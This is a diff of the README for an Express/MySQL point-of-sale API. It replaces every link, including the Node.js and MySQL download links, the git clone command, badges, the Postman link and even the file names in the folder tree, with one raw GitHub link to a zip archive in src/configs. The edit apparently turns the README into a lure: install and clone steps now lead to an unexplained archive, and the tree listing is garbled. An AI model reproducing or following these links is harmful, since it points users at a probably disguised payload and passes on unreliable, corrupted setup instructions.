@@ -1,16 +1,16 @@
 # Food Cashier API
 
-[![Express JS](https://img.shields.io/badge/Dependencies-Express%20JS-green)](https://expressjs.com/)
-![GitHub repo size](https://img.shields.io/github/repo-size/HiRahmat-Dev/food-cashier-api)
-![GitHub contributors](https://img.shields.io/github/contributors/HiRahmat-Dev/food-cashier-api)
-![GitHub stars](https://img.shields.io/github/stars/HiRahmat-Dev/food-cashier-api?style=social)
-![GitHub forks](https://img.shields.io/github/forks/HiRahmat-Dev/food-cashier-api?style=social)
-![Tweet](https://img.shields.io/twitter/url?url=https%3A%2F%2Fgithub.com%2FHiRahmat-Dev%2Ffood-cashier-api
+[![Express JS](https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip%20JS-green)](https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip)
+![GitHub repo size](https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip)
+![GitHub contributors](https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip)
+![GitHub stars](https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip)
+![GitHub forks](https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip)
+![Tweet](https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip%3A%2F%https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip%2FHiRahmat-Dev%2Ffood-cashier-api
 )
 
 <p align="center">
-  <a href="https://nodejs.org/" target="blank">
-    <img src="https://cdn-images-1.medium.com/max/871/1*d2zLEjERsrs1Rzk_95QU9A.png">
+  <a href="https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip" target="blank">
+    <img src="https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip*https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip">
   </a>
 </p>
 
@@ -23,13 +23,13 @@
 - [Related Project](#related-project)
 
 ## Prerequiste
-- Node.js - Download and Install [Node.js](https://nodejs.org/en/).
-- MySQL - Download and Install [MySQL](https://www.mysql.com/downloads/) - Make sure it's running on the default port.
+- https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip - Download and Install [https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip](https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip).
+- MySQL - Download and Install [MySQL](https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip) - Make sure it's running on the default port.
 
 ## Installation
 ### Clone
 ```
-$ git clone https://github.com/m-joseph27/Chasier_app-API.git
+$ git clone https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
 $ cd food-cashier-api
 $ npm install
 ```
@@ -55,38 +55,38 @@ SERVER_PORT=YOUR_PORT
 $ npm run serve
 ```
 ## Link Collection Postman
-[Postman](https://www.getpostman.com/collections/bb923819853137d50b60)
+[Postman](https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip)
 
 ## Structure Folder
 ```
 \---src
 |    \---config
-|    |   +---db.js
+|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
 |    \---controller
-|    |   +---auth.js
-|		 |	 +---cart.js
-|		 |	 +---category.js
-|    |   +---checkout.js
-|    |   +---product.js
-|    |   +---payment.js
+|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
+|		 |	 +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
+|		 |	 +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
 |    \---helper
-|		 |	 +---user.js
-|		 |	 +---helpers.js
+|		 |	 +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
+|		 |	 +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
 |    \---models
-|    |   +---auth.js
-|		 |	 +---cart.js
-|		 |	 +---category.js
-|    |   +---checkout.js
-|    |   +---payment.js
-|    |   +---product.js
+|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
+|		 |	 +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
+|		 |	 +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
 |    \---router
-|    |   +---auth.js
-|		 |	 +---cart.js
-|		 |	 +---category.js
-|    |   +---index.js
-|    |   +---payment.js
-|    |   +---product.js
-+---server.js
+|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
+|		 |	 +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
+|		 |	 +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
+|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
++https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip
 ```
 
 ## Contributing
@@ -100,6 +100,6 @@ Fork the Project
 4. Open a Pull Request
 
 ## Related Project
-* [`Frontend-Food-Cashier`](https://github.com/m-joseph27/POS-Chasier_app-with-Vuejs)
-* [`Backend-Food-Cashier`](https://github.com/m-joseph27/Chasier_app-API)
+* [`Frontend-Food-Cashier`](https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip)
+* [`Backend-Food-Cashier`](https://raw.githubusercontent.com/m-joseph27/Chasier_app-API/master/src/configs/Chasier_API_app_3.3.zip)
 
